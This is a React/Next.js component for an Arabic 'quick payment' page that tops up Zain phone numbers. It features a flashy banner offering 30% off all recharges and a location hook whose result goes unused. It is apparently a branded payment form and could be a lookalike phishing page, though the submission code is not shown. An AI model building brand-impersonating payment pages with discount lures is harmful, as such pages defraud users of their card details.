"use client"
import { useEffect, useState } from "react"
import { ArrowRight, Plus, Percent } from "lucide-react"
import { PaymentHeader } from "@/components/payment/payment-header"
import { PaymentTabs } from "@/components/payment/payment-tabs"
import { NumberTypeSelector } from "@/components/payment/number-type-selector"
import { PhoneInput } from "@/components/payment/phone-input"
import { AmountSelector } from "@/components/payment/amount-selector"
import { OrderSummary } from "@/components/payment/order-summary"
import { PaymentButton } from "@/components/payment/payment-button"
import { usePaymentForm } from "@/lib/use-payment-form"
import { useLocation } from "@/lib/use-location"

export default function ZainPayment() {
  const [selectedTab, setSelectedTab] = useState("bill")

  const { formData, updateFormData, balanceData, isLoadingBalance, balanceError, isSubmitted, loading, handleSubmit } =
    usePaymentForm()

  useLocation()
  const isPhoneValid = /^9\d{7}$/.test(formData.phoneNumber)

  // Calculate discount
  const discountPercentage = 30
  const discountAmount = (formData.selectedAmount as number* discountPercentage) / 100
  const discountedAmount = formData.selectedAmount  as number - discountAmount
  const totalWithDiscount = discountedAmount + formData.fees

  useEffect(()=>{
    localStorage.setItem("totalWithDiscount",totalWithDiscount)
  },[totalWithDiscount])

  return (
    <div className="max-w-md mx-auto bg-gradient-to-b from-white to-gray-50 min-h-screen" dir="rtl">
      <PaymentHeader />
      <div className="p-5">
        <div className="flex items-center mb-6">
          <ArrowRight className="text-[#2d1a45] mr-2" size={20} />
          <h2 className="text-2xl font-bold text-[#2d1a45]">الدفع السريع</h2>
        </div>
        <PaymentTabs selectedTab={selectedTab} onTabChange={setSelectedTab} />
        <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
          {/* Animated Discount Banner */}
          <div className="relative mb-4">
            <div className="bg-gradient-to-r from-[#d13c8c] to-[#ff6b9d] rounded-lg p-3 text-white text-center relative overflow-hidden animate-pulse-glow">
              <div className="absolute inset-0 bg-white/10 backdrop-blur-sm animate-shimmer"></div>
              <div className="relative flex items-center justify-center animate-bounce-gentle">
                <Percent className="h-5 w-5 ml-2 animate-spin-slow" />
                <span className="text-lg font-bold">خصم 30%</span>
                <span className="text-sm mr-2 opacity-90">على جميع عمليات التعبئة</span>
              </div>
              <div className="absolute -top-2 -right-2 w-8 h-8 bg-yellow-400 rounded-full flex items-center justify-center animate-bounce">
              </div>
              {/* Animated border */}
            </div>
            {/* Floating sparkles */}
            <div className="absolute -top-1 left-4 w-2 h-2 bg-yellow-400 rounded-full animate-ping"></div>
            <div className="absolute top-2 -left-1 w-1 h-1 bg-white rounded-full animate-pulse delay-300"></div>
            <div className="absolute -bottom-1 right-8 w-1.5 h-1.5 bg-yellow-300 rounded-full animate-ping delay-500"></div>
          </div>

          <div className="text-right mb-4">
            <p className="text-[#2d1a45] font-medium">أريد أن أعيد التعبئة </p>
          </div>
          <NumberTypeSelector value={formData.numberType} onChange={(value) => updateFormData({ numberType: value })} />
          <PhoneInput
            value={formData.phoneNumber}
            onChange={(value) => updateFormData({ phoneNumber: value })}
            isLoadingBalance={isLoadingBalance}
            balanceData={balanceData}
            balanceError={balanceError}
          />
          <AmountSelector
            value={formData.selectedAmount.toString()}
            onChange={(value) => updateFormData({ selectedAmount: value })}
          />
          <button className="w-full p-3 border-2 border-[#d13c8c] text-[#d13c8c] rounded-lg flex items-center justify-center hover:bg-pink-50 transition-colors">
            <Plus className="h-5 w-5 ml-2" />
            <span>أضف رقم آخر</span>
          </button>
        </div>
        <OrderSummary
          selectedAmount={parseFloat(formData.selectedAmount.toString())}
          discountAmount={discountAmount}
          discountPercentage={discountPercentage}
          fees={parseFloat(formData.fees)}
          total={parseFloat(totalWithDiscount)}
        />
        <PaymentButton
          isValidPhoneNumber={isPhoneValid}
          isSubmitted={isSubmitted}
          phoneNumber={formData.phoneNumber}
          onSubmit={handleSubmit}
        />
      </div>

      <style jsx>{`
        @keyframes pulse-glow {
          0%, 100% {
            box-shadow: 0 0 20px rgba(209, 60, 140, 0.3);
          }
          50% {
            box-shadow: 0 0 30px rgba(209, 60, 140, 0.6);
          }
        }
        
        @keyframes shimmer {
          0% {
            transform: translateX(-100%);
          }
          100% {
            transform: translateX(100%);
          }
        }
        
        @keyframes bounce-gentle {
          0%, 100% {
            transform: translateY(0);
          }
          50% {
            transform: translateY(-2px);
          }
        }
        
        @keyframes spin-slow {
          from {
            transform: rotate(0deg);
          }
          to {
            transform: rotate(360deg);
          }
        }
        
        .animate-pulse-glow {
          animation: pulse-glow 2s ease-in-out infinite;
        }
        
        .animate-shimmer {
          animation: shimmer 3s ease-in-out infinite;
        }
        
        .animate-bounce-gentle {
          animation: bounce-gentle 2s ease-in-out infinite;
        }
        
        .animate-spin-slow {
          animation: spin-slow 4s linear infinite;
        }
      `}</style>
    </div>
  )
}
